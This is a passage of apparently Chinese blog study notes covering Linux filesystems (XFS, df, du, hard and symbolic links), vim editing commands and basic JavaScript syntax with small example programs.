nfs_commondrwxr-xr-x. 2 root root 24 12月 28 07:32 nfsddrwxr-xr-x. 2 root root 4096 12月 28 07:32 nlsdrwxr-xr-x. 2 root root 27 12月 28 07:32 overlayfsdrwxr-xr-x. 2 root root 27 12月 28 07:32 pstoredrwxr-xr-x. 2 root root 28 12月 28 07:32 squashfsdrwxr-xr-x. 2 root root 23 12月 28 07:32 udfdrwxr-xr-x. 2 root root 23 12月 28 07:32 xfs VFS(Virtual Filesystem Switch)Linux通过VFS识别不同的文件系统，Linux识别的文件系统都是VFS管理 更多VFS的信息 XFS简介随着磁盘的容量越来越大，现在的单位已经是PB、EB，ext采用的是先规划出inode、区块、元数据，在大容量的磁盘面前需要很多时间，特别是一些巨型文件，在ext的效率也不是很好，然后有了xfs文件系统，是一个日志式文件系统，具备了几乎所有ext4文件系统的功能 XFS文件系统的配置1.数据区（data section）类似于ext的block groups，分为多个存储区群组allocation groups，每个群组包括了 整个文件系统的超级区块 inode的分配与追踪，inode与数据区块都是动态产生（所有格式化很快），不同意ext的事先规划 剩余空间的管理机制 此外，xfs的区块容量可以设置为512B64K（Linux最大4K），inode可设置256B2MB， 2.文件系统活动登陆区（log section）记录文件系统的变化，就像日志区 因为所有操作都要在这个区作记录，所有这个区的读写很频繁 xfs在设计上允许使用外部磁盘作为登陆区（比如使用SSD加快速度） 实时运行区（realtime section）建立文件时，xfs会在这个区里找数个extent区块放置文件，然后写入data section的inode和区块中，extent的大小在格式化时指定，范围4K~1G xfs的详细信息可以参考xfs官网和https://blog.csdn.net/scaleqiao/article/details/520985 xfs描述数据观察12345678910111213[manu@study ~]$ df -T /boot文件系统 类型 1K-块 已用 可用 已用% 挂载点/dev/sda2 xfs 1038336 174128 864208 17% /boot[manu@study ~]$ xfs_info /dev/sda2meta-data=/dev/sda2 isize=512 agcount=4, agsize=65536 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0 spinodes=0data = bsize=4096 blocks=262144, imaxpct=25 = sunit=0 swidth=0 blksnaming =version 2 bsize=4096 ascii-ci=0 ftype=1log =internal bsize=4096 blocks=2560, version=2 = sectsz=512 sunit=0 blks, lazy-count=1realtime =none extsz=4096 blocks=0, rtextents=0 isize指的是inode的容量256B，agcount代表allocation group的数量4个，agsize代表每个allocation group有多少区块，区块大小在第4行bsize=4k，所以整个文件系统大小=4X65536X4K sectsz代表逻辑扇区的容量设置为512B log=internal代表log section在文件系统内部，大小=4096BX2560 简单操作df 列出文件系统的整体磁盘使用量 df [-] dir/file -a列出所有文件系统 -k以KB显示文件系统 -m以MB显示文件系统 -h以GB、MB、KB自动显示，方便阅读 -HM=1024K -T显示硬盘分区的文件系统 -i使用inode的形式显示 没选项时默认将系统的所有文件系统全列出来 123456789101112[manu@study ~]$ df文件系统 1K-块 已用 可用 已用% 挂载点devtmpfs 480848 0 480848 0% /devtmpfs 497872 0 497872 0% /dev/shmtmpfs 497872 8768 489104 2% /runtmpfs 497872 0 497872 0% /sys/fs/cgroup/dev/mapper/centos-root 10475520 4250208 6225312 41% //dev/sda2 1038336 174128 864208 17% /boot/dev/mapper/centos-home 5232640 122516 5110124 3% /hometmpfs 99576 4 99572 1% /run/user/42tmpfs 99576 40 99536 1% /run/user/1000/dev/sr0 10767514 10767514 0 100% /run/media/manu/CentOS 7 x86_64 这里说一下sr0，sr0是CD-ROM，无法写入，所以使用100% du 会去文件系统内找当前目录或选定目录的文件数据 du [-] dirname/filename -a列出所有的文件和目录容量，默认是目录容量 -h以易读的形式显示 -s仅列出该目录的总量 -S 仅列出子目录 -k默认值 -m 硬链接Hard link我们知道，创建文件时会有一个inode，而目录是通过记录文件的inode来链接到该文件的 所谓硬式链接就是：在某目录下创建一个文件，而这个文件的inode是我所需要的文件的inode 实例 123456[root@study /]# ll -i yangyong.text 3705 -rw-r--r--. 1 root root 0 1月 2 22:29 yangyong.text[root@study /]# ln yangyong.text test[root@study /]# ll -i yangyong.text test 3705 -rw-r--r--. 2 root root 0 1月 2 22:29 test3705 -rw-r--r--. 2 root root 0 1月 2 22:29 yangyong.text 2表示有两个文件链接到了这个inode 比较安全(相当于备份) 硬链接一般不会占磁盘空间大小 限制 只能在同一个文件系统 不能链接目录 符号链接Symbolic Link建立一个文件，这个文件记录的是我所需要的文件的文件名 实例 123[root@study /]# ln -s yangyong.text test2[root@study /]# ll test2lrwxrwxrwx. 1 root root 13 1月 7 22:49 test2 -&gt; yangyong.text test2的文件大小13B，源文件的文件名也是13个字符 源文件没了，链接文件会找不到文件 符号链接就相当于Windows的快捷方式 ln ln [-] sourcefile linkname -s符号链接，默认硬链接 -f若有这个linkname则将文件删除再创建 创建一个目录时，这个目录下默认至少有两个文件，.and..，所有新目录会有两个链接数，父目录也会增加一个目录数 参考《鸟哥的Linux私房菜 基础学习篇》","link":"/Linux/5.%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F.html"},{"title":"(八)vim editer","text":"简单来说就是一个文本编辑器，如同前面的nano，但vi有更多功能，vim则是vi的的升级版 学习vim的主要条件是因为 所有UNIX-like都有vi，而其他的文本编辑器未必有 很多软件的编辑接口都有vi vim具有程序编程的能力，比如语法高亮 编辑迅速 使用vi三种模式 command mode 命令vi filename就会进入command mode(一般命令模式)，不管文件名存不存在（存在就打开，不存在就新建） 可以进行复制粘贴、删除、搜索、替换等操作 insert mode 在一般模式下使用i、I、o、O等就可以进入insert mode(编辑模式) 可以编辑字符 esc退出编辑模式 command-line mode(命令行模式) 一般模式下输入:、/、?都可以进入命令行模式 可以读取、存储文件 esc退出 三者的关系如下图 注意编辑模式和命令行模式不能互相转换 vi按键说明一般命令模式1.移动光标 按键 含义 h或者← 光标向左移动一个字符 j或↓ 向下移动 k或↑ 向上移动 l或→ 向右移动（特殊用法：10j/↓代表向下移动10行） ctrl+f 向下移动一页，相当于PD ctrl+b 向上移动一页，相当于PU ctrl+d 向下移动半页 ctrl+u 向上移动半页 + 移动到非空格符的下一行 - 非空格符的上一行 nspace n代表数字，数字接space代表移动多少个字符 0或home 移动到行首 $或end 移动到行末 H 移动屏幕首行字符 M 移动屏幕中央行首字符 L 移动屏幕末行首字符 G 移动到文件最后一行 nG 表示移动到第n行 nenter 表示向下移动n行 2.查找替换 按键 含义 /word 向下寻找word ?word 向上寻找word n 继续上一个寻找动作 N 反向n :n1,n2s/word1/word2/g 从n1行到n2行将word1替换成word2 :1,$s/word1/word2/g 全文替换 :1,$s/word1/word2/gc 替换时提醒用户 3.删除、复制粘贴 按键 含义 x、X x相当于del，X相当于backspace nx 表示向后删除n个字符 dd 剪切光标所在的一行 ndd 剪切光标所在的向下n行 d1G 剪切光标到第一行 dG 剪切光标到最后 d$ 剪切光标到本行末字符 d0 剪切光标到本行首字符 yy 复制光标在的一行 nyy 复制光标所在的向下n行 y1G 复制光标到第一行 yG 复制光标到最后一行 y0 复制光标到行首字符 y$ 复制光标到行末字符 p&amp;P 如果复制的是一串字符，p会粘贴到光标后面，P粘贴到光标前面；如果复制几行，p粘贴到光标下一行，P粘贴到光标上一行 J 将光标所在下一行结合成一行，前面可以接n c 重复删除多个数据，删除10行，10cj u 恢复一个操作 ctrl+r 撤销一个操作 . 复制前一个操作 编辑模式 按键 含义 i&amp;I i从当前光标插入，I从光标所在行的第一个非空格字符处插入 a&amp;A a从光标下一个字符插入，A从所在行最后一个字符插入 o&amp;O o从光标下一行插入新的一行，O从光标上插入 r&amp;R 进入replace mode（替换模式），r会替换光标的那个字符，R则是一直处于替换模式，直到esc 命令行模式 按键 含义 :w 写入硬盘 :w！ 文件为只读时，强制写入，还是要看用户的权限 :q 退出vi :q！ 强制退出，比如做了修改不想保存时 :wq 保存退出，可接！ ZZ 没修改时，则直接退出，修改了后，则保存退出 :w [path/filename] 另存文件，后面接路径和文件名 :r [path/filename] 读取文件，在现有文件中读取另一个文件到这个文件中 :n1,n2 w [path/filename] 将n1-n2行的数据保存到另一个文件 :！comman 暂时退出vi执行command指令 :set nu 显示行号 :set nonu 不显示行号 vim缓存进行vim编辑时，会临时有一个缓存文件.filename.swp 当文件正常保存时，缓存文件会自动删除 当电脑突然宕机时，缓存文件不会消失，可使用缓存来恢复工作 ctrl+z可暂时将编辑工作放入后台，可以看到缓存文件 123456789[1]+ 已停止 vim /tmp/my_vim/services[root@study ~]# cd /tmp/my_vim/[root@study my_vim]# ls -al总用量 720drwxr-xr-x. 2 root root 62 1月 16 03:38 .drwxrwxrwt. 141 root root 12288 1月 16 03:47 ..-rw-r--r--. 1 root root 4847 1月 15 21:47 man_db.conf-rw-r--r--. 1 root root 670293 1月 15 21:45 services-rw-r--r--. 1 root root 40960 1月 16 03:40 .services.swp kill -9 %1可以杀死刚才的后台，模拟非正常保存 此时我再打开文件，会出现警告（汉化万岁！！！！） 123456789101112131415161718192021E325: 注意发现交换文件 &quot;/tmp/my_vim/.services.swp&quot; 所有者: root 日期: Thu Jan 16 03:40:56 2020 文件名: /tmp/my_vim/services 修改过: 是 用户名: root 主机名: study.centos.vbird 进程 ID: 11776正在打开文件 &quot;/tmp/my_vim/services&quot; 日期: Wed Jan 15 21:45:18 2020(1) Another program may be editing the same file. If this is the case, be careful not to end up with two different instances of the same file when making changes. Quit, or continue with caution.(2) An edit session for this file crashed. 如果是这样，请用 &quot;:recover&quot; 或 &quot;vim -r /tmp/my_vim/services&quot; 恢复修改的内容 (请见 &quot;:help recovery&quot;)。 如果你已经进行了恢复，请删除交换文件 &quot;/tmp/my_vim/.services.swp&quot; 以避免再看到此消息。交换文件 &quot;/tmp/my_vim/.services.swp&quot; 已存在！以只读方式打开([O]), 直接编辑((E)), 恢复((R)), 删除交换文件((D)), 退出((Q)), 中止((A)): vimvim与vi的比较 有语法高亮 更多的程序语法 可以debug 可视区块（Visual block）在这个模式下，我们可以对文本镜进入行选择，列选择 按键 含义 v 字符选择，将光标经过的地方选择 V 行选择，将光标经过的行选择 ctrl+v 列选择，将光标经过的列选择 y 将选择的地方复制 p 在光标处粘贴复制的区块 d 删除选择的地方 多文件编辑我们有时候会编辑多个文件，有着不同的编辑方式 按键 含义 :n 下一个文件 :N 上一个文件 :files 列出这个vim打开的文件 1.在多个vim窗口编辑操作很简单，但如果想将A文件的内容复制到B去，需要用鼠标选中复制粘贴，这样有一个缺点，那就是A文件tab会被鼠标转换成空格，导致内容无法对齐，可以采用另一种编辑方式 2.使用一个vim窗口编辑 vim file1 file2打开两个文件 在命令模式下使用 :e file打开文件 使用:files可以查看打开了多少个文件 多窗口功能当有一个非常的文本文件时，我想在首行和末行操作时，需不需要来回费劲的G和翻页呢？ 我们可以使用:sp来再次打开这个文件，这时出现的则是同一个文件在两个窗口中 组合按键 含义 :sp [filename] 水平新建窗口，默认打开同一文件，有其他文件则打开其他文件 :vsplit filename 垂直 ctrl+w+j/↓ 按住ctrl，按下w再按j，将光标移动到下一个窗口 ctrl+w+k/↑ 移动到上一个窗口 ctrl+w+q 退出这个窗口，也可以在这个窗口输入:q，或者:close vim关键字补全类似Hbuild、sublime的关键字补全功能，识别语法补全关键字，vim也是可以的 组合按键 含义 ctrl+x -&gt; ctrl+o 通过正在编辑的文件的内容作为关键字，进行补齐 ctrl+x -&gt; ctrl+f 以当前目录内的文件名作为关键词，进行补齐 ctrl+x -&gt; ctrl+n 以扩展名作为语法补充，通过vim内置关键字补齐 vim环境设置与记录 vim有一个主动记录操作的文件~/.viminfo，这样你每次重新打开文件都会回到上次的工作状态 vim的环境设置参数也有很多 参数 含义 :set nu/nonu 设置/取消行号 :set hlsearch/nohlsearch high light search，高亮查找 :set autoindent/noautoindent 自动缩进 :set backup/nobackup 自动备份文件，例如，在编辑host时，会有一个host~的文件记录源文件 :set ruler 显示右下角的状态 :set showmode 显示各种模式 :set backspace=(012) 2代表可以删除任何字符，0和1代表只能删除输入的字符 :set all 显示设置的所有环境参数 :set 显示与系统默认的参数不同的参数 :syntax on/off 程序语法，开启会有高亮debug :set bg=light/dark 背景色调 不可能每次进入文件都要设置，需要一个配置文件 整体的vim设置值在/etc/vimrc中，这个文件不建议修改，可以自行建立一个文件~/.vimrc 格式 123[root@study my_vim]# vim ~/.vimrc&quot;代表注释set hlsearch &quot;high light vim使用的问题 test是我在windows上编辑的，test2是我在Linux上编辑的 可以看到dos使用的换行符是^M$(CRLF)，Linux使用的换行符是$(LF) 一般没什么问题，但当文件是一个shell脚本程序时，Linux会误判，导致程序无法运行，需要将CR去掉才行（批量替换？） 有一个简单的命令dos2unix可以直接将格式转换 但是这个指令默认没有安装，安装方法： 1234567[root@study my_vim]# mount /dev/sr0 /mntmount: /dev/sr0 写保护，将以只读方式挂载[root@study my_vim]# rpm -ivh /mnt/Packages/dos2unix-*警告：/mnt/Packages/dos2unix-6.0.3-7.el7.x86_64.rpm: 头V3 RSA/SHA256 Signatrue, 密钥 ID f4a80eb5: NOKEY准备中... ################################# [100%]正在升级/安装... 1:dos2unix-6.0.3-7.el7 ################################# [100%] 命令语法 1234dos2unix [-kn] file [newfile]unix2dos [-kn] file [newfile]-k:保留原本的mtime格式-n:保留旧文件，后面接旧文件 语系编码转换指令iconv语法 123456iconv --listiconv -f 原本编码 -t 新编码 filename [-o newfile]--list:列出支持的编码-f:from-t:to-o file:保留旧文件，得到新文件 将utf-8繁体转换utf-8简体的指令 1iconv -f utf8 -t big5 file | iconv -f big5 -t gb2312 | iconv -f gb2312 -t utf8 -o file.utf8 实战技巧 快捷键 功能描述 w 或 W 光标移动至下一个单词的单词首 b 或 B 光标移动至上一个单词的单词首 e 或 E 光标移动至下一个单词的单词尾 nw 或 nW n 为数字，表示光标向右移动 n 个单词 nb 或 nB n 为数字，表示光标向左移动 n 个单词 Vim光标移动到匹配的括号处程序员在编辑程序时，经常会为将光标移动到与一个 “(“ 匹配的 “)” （对于 [] 和 {} 也是一样的）处而感到头疼。Vim 里面提供了一个非常方便地査找匹配括号的命令，这就是 “%”。 多行注释 首先按esc进入命令行模式下，按下Ctrl + v，进入列（也叫区块）模式; 在行首使用上下键选择需要注释的多行; 按下键盘（大写）“I”键，进入插入模式； 然后输入注释符（“//”、“#”等）; 最后按下“Esc”键 注：在按下 esc键后，会稍等一会才会出现注释，不要着急~时间很短的 使用&gt;配合ctrl+v可进行整体缩进 代码折叠https://www.jianshu.com/p/16e0b822b682 打开多个文件、同时显示多个文件、在文件之间切换打开多个文件 vim file1 file2 ... file :open file :e file 在文件之间切换 Ctrl+6—下一个文件 :bn—下一个文件 :bp—上一个文件 :bd [num1,num2]/[filename]-关闭buffer 多文档编辑的命令 :n 编辑下一个文档。 :2n 编辑下两个文档。 :N 编辑上一个文档。注意，该方法只能用于同时打开多个文档。 :e 文档名 这是在进入vim后，不离开 vim 的情形下打开其他文档。 :e# 或 Ctrl+ˆ 编辑上一个文档,用于两个文档相互交换编辑时使用。?# 代表的是编辑前一次编辑的文档 :files 或 :buffers 或 :ls 可以列出目前 缓冲区 中的所有文档。加号 + 表示 缓冲区已经被修改过了。＃代表上一次编辑的文档，%是目前正在编辑中的文档 :b 文档名或编号 移至该文档。 :f 或 Ctrl+g 显示当前正在编辑的文档名称。 :f filename 改变编辑中的文档名。(file) 多文件切换 通过vim打开多个文件（可以通过ctags或者cscope） “:ls”查看当前打开的buffer（文件） “:b num”切换文件（其中num为buffer list中的编号） 其他快捷键 表示范围的命令： l： 表示一个字符，可以于操作符组合使用； aw ：表示单词+空格，前面可以加数字的 iw： 选中单词/空格； 前面可以加数字； ap： 表示一个段落，与操作符组合使用； 跳转的指令： G键是跳转命令。默认跳到最后一行；前面可以加数字的；表示跳到第几行； gg键为跳转命令，默认跳到第一行，前面可以加数字，表示跳到第几行； 0： 跳转命令，跳到行首 ； $: 表示跳到行尾； w: 表示跳转到下一个单词的头部； e: 表示跳转到下一个单词的尾部； b： 表示跳转到上一个单词的头部； ge：表示跳转到上一位单词的尾差部； A： 跳转到行尾，并进行插入模式； I： 跳转到行首，并进行插入模式； H: 当前页的页首； M：当前页的页中间； L：当前页的页尾； zz：让光标所在的行居于屏幕中央； 操作功能符： &gt;: 表示向右缩进的动作； &lt;: 表示减少缩进； gu: 转换为小写的动作； gU: 转换为大写的动作； u/U：在可视模式下，可以用来转换选中的字符； g~：用于转换——小写变大写，大写变小写； x：删除光标下的字符； s：删除光标下的字符并进入插入模式； X：用于删除光标之前的字符； c：为一个动作，删除并进入插入模式，可以组合使用，如cw， cG等； cc：表示删除本行并进行插入模式； J： 把当前行与下一行连接在一起； K: 用于查看处于光标之下的那个单词的手册页； r: 用于替换单个字符； R：用于连续替换多个字符； 查找操作： f{word}表示：在行内查找下一个指定的字符，前面可以加数字，表示第几个字符； （用；与，进行前进与退回） F{word}表示：在行内查找上一个指定的字符，前面可以加数字，表示第几个字符； （用；与，进行前进与退回） /{pattern}表示：在文档内查找下一处匹配的项(用 n 和 N 进行前进与返回, gn与gN会进行面对字符的可视模式， 下同；） ?{pattern}表示：在文档内查找上一处匹配的项(用 n 和 N 进行前进与返回） * 表示：向下查找光标下的单词，前面可以加数字(用 n 和 N 进行前进与返回） # 表示：向止查找光标下的单词，前面可以加数字(用 n 和 N 进行前进与返回） 与 ctrl 相关的快捷键： ctrl-g 表示显示文件信息； ctrl-f 向下翻一页； ctrl-b 向上翻一页； ctrl-d 向下翻半页； ctrl-u 向下翻半页； 精准跳转和修改 我个人感觉 vim 快最重要的原因就是精准选择。而实现精准选择的必要途径就是搜索。搜索是 vim 的核心。比如说你需要跳到下个函数，那直接/def。再比如需要跳到括号末，直接f)。终端中，刚输入完python eval.py device cuda data.batch_size 256，发现这行指令中的python要改成python3，可以 直接Fna3。又发现前面要加sudo，直接^isudo。总之一切精确修改都是通过搜索来完成的，这与我们不使用vim编程时搜索只用来查找代码有本质区别 结合v V ctrl+v 这三种可视化模式进行精确选择，配合cdyrp等指令，可以完成极其灵活的代码增删改查。到这一步你会发现vim对你编程速度的提高已经是革命性的了 数字增减 normal模式下 ctrl-actrl-x 删减词 normal: dawdwcwctrl+w insert mode: ctrl+w 区块选择 vi” → 会选择 foo. va” → 会选择 “foo”. vi) → 会选择 “foo”. va) → 会选择(“foo”). v2i) → 会选择 map (+) (“foo”) v2a) → 会选择 (map (+) (“foo”)) 与系统剪贴板交互 输入 vim --version 查看是否支持 clipboard 支持则使用 &quot;y+ 将vim选区复制进系统剪贴板同理，使用 &quot;p+ 粘贴系统剪贴板","link":"/Linux/8.vim-editer.html"},{"title":"JavaScript基础","text":"JavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。虽然它是作为开发Web页面的脚本语言而出名的，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式和声明式（如函数式编程）风格。 ——百度百科 示例代码先展示一段js代码，从MDN扒下来的，包含了最基本的用法 guessNumberGame.js &gt;folded123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105/** * * 游戏逻辑： 随机生成一个 100 以内的自然数。 记录玩家当前的轮数。从 1 开始。 为玩家提供一种猜测数字的方法。 一旦有结果提交，先将其记录下来，以便用户可以看到他们先前的猜测。 然后检查它是否正确。 如果正确： 显示祝贺消息。 阻止玩家继续猜测（这会使游戏混乱）。 显示控件允许玩家重新开始游戏。 如果出错，并且玩家有剩余轮次： 告诉玩家他们错了。 允许他们输入另一个猜测。 轮数加 1。 如果出错，并且玩家没有剩余轮次： 告诉玩家游戏结束。 阻止玩家继续猜测（这会使游戏混乱）。 显示控件允许玩家重新开始游戏。 一旦游戏重启，确保游戏的逻辑和UI完全重置，然后返回步骤1。 */// 创建随机数let randomNumber = Math.floor(Math.random()*100)+1;// 记录猜过的数const guesses = document.querySelector('.guesses');const lastResult = document.querySelector('.lastResult')// 告诉猜高还是低const lowOrHi = document.querySelector('.lowOrHi');const guessSubmit = document.querySelector('.guessSubmit');const guessField = document.querySelector('.guessField');let guessCount = 1;let resetButton;function checkGuess(){ let userGuess = Number(guessField.value); if(guessCount === 1){ guesses.textContent = '上次猜的数:'; } guesses.textContent += userGuess+' '; guesses.style.backgroundColor = 'yellow'; if(userGuess === randomNumber){ lastResult.textContent = '恭喜你！猜对了'; lastResult.style.backgroundColor = 'green'; lowOrHi.textContent = ''; setGameOver(); } else if(guessCount === 5){ lastResult.textContent = 'Game over'; setGameOver(); } else { lastResult.textContent = '你猜错了！'; lastResult.style.backgroundColor = 'red'; if(userGuess &lt; randomNumber) { lowOrHi.textContent = '你猜低了！'; lowOrHi.style.backgroundColor = 'green'; } else if(userGuess &gt; randomNumber) { lowOrHi.textContent = '你猜高了'; lowOrHi.style.backgroundColor = 'green'; } } guessCount++; guessField.value = ''; guessField.focus();}function setGameOver(){ guessField.disabled = true; guessSubmit.disabled = true; // 创建button resetButton = document.createElement('button'); resetButton.textContent = '开始新游戏'; // 添加到Html底部 document.body.appendChild(resetButton); resetButton.addEventListener('click',resetGame);}function resetGame() { guessCount = 1; // 选中&lt;div class='resultParas'&gt;&lt;/div&gt;的所有p元素 const resetParas = document.querySelectorAll('.resultParas p'); for (let i = 0 ; i &lt; resetParas.length; i++) { resetParas[i].textContent = ''; }// 取消重置按钮 resetButton.parentNode.remove guessField.disabled = false; guessSubmit.disabled = false; guessField.value = ''; guessField.focus(); lastResult.style.backgroundColor = 'white'; lowOrHi.style.backgroundColor = 'white'; guesses.style.backgroundColor = 'white'; randomNumber = Math.floor(Math.random() * 100) + 1; }guessSubmit.addEventListener('click',checkGuess); html test.html >folded123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div class='resultParas'&gt; &lt;p class=&quot;guesses&quot;&gt;&lt;/p&gt; &lt;p class=&quot;lastResult&quot;&gt;&lt;/p&gt; &lt;p class=&quot;lowOrHi&quot;&gt;&lt;/p&gt; &lt;label for=&quot;guessField&quot;&gt;请猜数：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;guessField&quot; class=&quot;guessField&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;确定&quot; class=&quot;guessSubmit&quot;&gt; &lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;./js/guessNumberGame.js&quot;&gt;&lt;/script&gt;&lt;/html&gt; 变量定义使用let来声明变量 1let age; 初始化 1age = 19; 声明+初始化 1let age = 19; 还有var也可以声明变量，他与let的区别如下 1.var的变量提升 1234567// truename = 'manu';var name;//falsename = 'manu';let name; 2.var的多次声明 1234567891011//truevar name = 'muyang';var name = 'manu';//falselet name = 'muyang';let name = 'manu';//truelet name = 'muyang';name = 'manu'; 命名规范 不能以下划线开头，它在js里由特殊意义 不能以数字开头 建议驼峰命名法 大小写敏感 不能与关键字重名 类型Numberjs给一个变量赋值数字不需要声明类型，和python类似 1let age = 19; String定义字符串，单双引号都可以 1let name = 'manu' Boolean12let iAmPeople = true;let result = 1 &gt; 3; Array和其他语言一样从0开始索引 1234567//定义let array = [1,2,3,4];let arrayString = ['a','b','c']//访问array[0];arrayString[2]; Object定义一个对象的多个属性 12let ren = {name:'muyang',age:19};console.log(ren.age); js是动态类型语言，不需要指定类型，使用引号就是字符串，数字就代表number，可以使用typeof返回传递变量的类型 12let name = 'shpherd'typeof name; Map SetES6引入的，map就是键值对 123456789var m = new Map([['Michael', 95], ['Bob', 75], ['Tracy', 85]]);// 获取值m.get('Michael'); // 95// 添加键值对m.set('new',17);// 判断键是否存在m.has('new');// true// 删除键m.delete('new'); set是key的集合，所以不能重复 12var s1 = new Set(); // 空Setvar s2 = new Set([1, 2, 3]); // 含1, 2, 3 iterable同样是ES6被引入，Map和Set、Array都是iterable类型的，可以通过for…of遍历 for…in 和 for…of 的区别就是使用数组时，因为数组也是对象，in会将特殊的属性边遍历出来，而of不会，of遍历map时会得到多个长度为2的数组 12345for (var x of m) { // 遍历Map console.log(x[0] + '=' + x[1]);}/*[&quot;Michael&quot;, 95][&quot;Bob&quot;, 75][&quot;Tracy&quot;, 85]*/ 实际上更常用的是使用内置方法forEach来遍历 1234567let a = [1,2,3,4]a.forEach(function (v, k, arr) { // v: 指向当前元素的值 // k: 指向当前索引 // arr: 指向Array对象本身 console.log(k + '= ' + v);}); set的前两个参数一样，因为没有索引 map同上 运算符算术 运算符 名称 作用 示例 + 加法 两个数相加。 6 + 9 - 减法 从左边减去右边的数。 20 - 15 * 乘法 两个数相乘。 3 * 7 / 除法 用右边的数除左边的数 10 / 5 % 求余(有时候也叫取模) 在你将左边的数分成同右边数字相同的若干整数部分后，返回剩下的余数 8 % 3 (返回 2，8除以3的倍数，余下2 。) ** 幂 取底数的指数次方，即指数所指定的底数相乘。它在EcmaScript 2016 中首次引入。 5 ** 5 (返回 3125，相当于 5 * 5 * 5 * 5 * 5 。) 赋值 运算符 名称 作用 示例 等价于 += 加法赋值 右边的数值加上左边的变量，然后再返回新的变量。 x = 3; x += 4; x = 3; x = x + 4; -= 减法赋值 左边的变量减去右边的数值，然后再返回新的变量。 x = 6; x -= 3; x = 6; x = x - 3; *= 乘法赋值 左边的变量乘以右边的数值，然后再返回新的变量。 x = 2; x *= 3; x = 2; x = x * 3; /= 除法赋值 左边的变量除以右边的数值，然后再返回新的变量。 x = 10; x /= 5; x = 10; x = x / 5; 比较 运算符 名称 作用 示例 === 严格等于 测试左右值是否相同 5 === 2 + 4 !== 严格不等于 测试左右值是否不相同 5 !== 2 + 3 &lt; 小于 测试左值是否小于右值。 10 &lt; 6 &gt; 大于 测试左值是否大于右值 10 &gt; 20 &lt;= 小于或等于 测试左值是否小于或等于右值。 3 &lt;= 2 &gt;= 大于或等于 测试左值是否大于或等于正确值。 5 &gt;= 4 ==与===的区别：==可以比较类型不同的值（结果难以预料） 示例test.html &gt;folded123&lt;button class='sw'&gt;true&lt;/button&gt;&lt;p&gt;The button is true&lt;/p&gt;&lt;script src ='./js/switcher.js'&gt;&lt;/script&gt; switcher.js &gt;folded12345678910111213const btn = document.querySelector('.sw');const txt = document.querySelector('.sw + p');btn.addEventListener('click',switcher);function switcher(){ if (btn.textContent === 'true'){ btn.textContent = 'off'; txt.textContent ='The button is off'; } else { btn.textContent = 'true'; txt.textContent = 'The button is true'; }} 字符串普普通通的字符串 123let a = 'What is up?';let b = &quot;I'am fine&quot;;let c = 'I\\' am fine'; 连接字符串使用+将字符串连起来 1234let a = 'hello ';let b = 'world';let c = a +b;let d = c + 'where are you?' 数字与字符1.连接字符串和数字时，会自动把数字变成字符串 123let a = 19;let b = test;let c = a+b; 2.数字–&gt;字符串 12let a = 23;let b = a.toString(); 3.字符串–&gt;数字 12let a = '23';let b = Number(a); 处理字符串建议在处理字符串时，先考虑官方提供的方法 1.获取长度length 12let name = 'manu';name.length; 2.获取特定字符 1234//第一个字符name[0];//最后一个字符name[name.length-1]; 3.获取子字符串位置 1name.indexOf('herd'); 返回4，若找不到，则返回-1 4.获取规定位置的字符串 123456//得到索引1到最后的字符串name.slice(1);//3-5的字符串name.slice(3,5);//从索引2开始截取3字符name.substr(2,3); 5.大小写转换 12name.toLowerCase();name.toUpperCase(); 6.替换 replace需要两个参数，一是需要替换的字符，而是替换后的字符 1name.replace('she','test'); 注意，不改变原name的值，他只是返回一个新的值 数组数组可以存储任意类型，包括数组 123456//创建let arr = [1,'hello',3,5,[1,2,3]];//访问arr[0];//修改arr[0] = 'test'; 处理数组1.获取长度 1arr.length; 2.遍历数组 123for(let i=0; i&lt;arr.length; i++){ console.log(arr[i]);} 3.字符串与数组的转换 字符串–&gt;数组 1234let str = '1,2,3,4,5,6,7,8,9';//使用逗号分离每个元素let arr = numStr.split(',');//[&quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;] 数组–&gt;字符串 123456let newStr = arr.join('-');//&quot;1-2-3-4-5-6-7-8-9&quot;//或者let newStr2 = arr.toString();//&quot;1,2,3,4,5,6,7,8,9&quot;//toString的局限就是不能控制分隔符 添加与删除元素1.在末尾添加 123arr.push(4);//会返回新数组长度，可以添加多个元素，如arr.push(4,5,6,7); 2.删除末尾 12arr.pop();//返回删除的值 3.在开头添加 12arr.unshift('test');//返回新数组长度 4.删除开头 12arr.shift();//返回删除的值 流程控制if语句12345if(boolean){ //run code} else { //run code} if分支 123456789if(boolean){} else if {} else if {} else{} switch语句switch可以写的if也可以写，switch相对比较简洁，但if可以写的switch不一定可以写（有范围时） 12345let a = 2;switch(a){ case 0: console.log(0);break; case 2: console.log(2);break;} for循环123for(let i=0;i&lt;10;i++){ //循环体} for…in1234567891011121314var o = { name: 'Jack', age: 20, city: 'Beijing'};for (var key in o) { console.log(key); // 'name', 'age', 'city'} var a = ['A', 'B', 'C'];for (var i in a) { // 遍历的是属性 console.log(i); // '0', '1', '2' console.log(a[i]); // 'A', 'B', 'C'} while循环123while(boolean){ //循环体} 解构赋值同时对一组变量进行赋值 123var [x, y, z] = ['hello', 'JavaScript', 'ES6'];//嵌套赋值let [x, [y, z]] = ['hello', ['JavaScript', 'ES6']]; 从一个对象获取属性 123456789var person = { name: '小明', age: 20, gender: 'male', passport: 'G-12345678', school: 'No.4 middle school'};// 因为对象不是iterable类型的，所以不能用[]var {name,age,gender} = person; 对象的对象 1234567891011var animal = { age : 2, name : 'haho', gender : 'male', son :{ info: 'foo', other: 'bar', }};//注意层次var {age, name, son:{info, other}} = animal; 重命名 1let {age:ag, name:na, son:{info:inf, other:ot}} = animal; 为了防止没有找到属性而出现undefined，可以设置一个默认值 1let {age,flag = false} = animal; 场景快速交换值 12let a = 1, 